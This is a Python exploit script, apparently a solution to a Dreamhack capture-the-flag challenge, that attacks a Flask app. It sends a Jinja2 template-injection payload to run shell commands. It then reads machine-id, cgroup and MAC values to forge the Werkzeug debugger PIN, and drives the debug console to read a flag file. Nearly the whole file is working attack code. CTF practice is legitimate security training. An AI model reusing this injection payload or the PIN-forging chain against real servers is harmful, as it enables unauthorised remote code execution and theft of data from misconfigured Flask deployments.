import requests
import html
import re
from urllib.parse import quote

url = "http://host3.dreamhack.games:19478/"

def clean(text):
    text = html.unescape(text)
    leak = re.findall(r'404 :(.+)Not Found', text, re.DOTALL)[0]
    
    return leak.strip()

def rce(cmd=''):
    payload = "{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('%s').read() }}" % cmd

    res = requests.get(f'{url}/{payload}')

    return clean(res.text)

# public values
username = 'root'
filename = "/usr/local/lib/python3.8/site-packages/flask/app.py"

# private values
mac = rce("python3 -c \\'import uuid;print(uuid.getnode())\\'")

machine_id = ""
for file in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    value = rce(f'cat {file}')

    if value:
        machine_id += value
        break

machine_id += rce("cat /proc/self/cgroup").split('\n')[0].strip().rpartition("/")[2]

# crack pin
from crack import crack

public = [username, 'flask.app', 'Flask', filename]
private = [mac, machine_id.encode()]

pin, cookie = crack(public, private)

print("Pin:", pin)

# console secret
err = rce('curl http://127.0.0.1:8000/keygen/a')

secret = re.findall(r'SECRET = "(.+)"', err)[0].strip()

print("Secret:", secret)

# get flag
cmd = 'open("/flag").read()'

payload = f'curl -G http://127.0.0.1:8000/console -d __debugger__=yes -d cmd={quote(cmd)} -d frm=0 -d s={secret} -H "Cookie: {cookie}"'

resp = rce(quote(payload))

flag = re.findall(r'([A-Za-z0-9]+\{[^}]+\})', resp)[0]
print("Flag:", flag)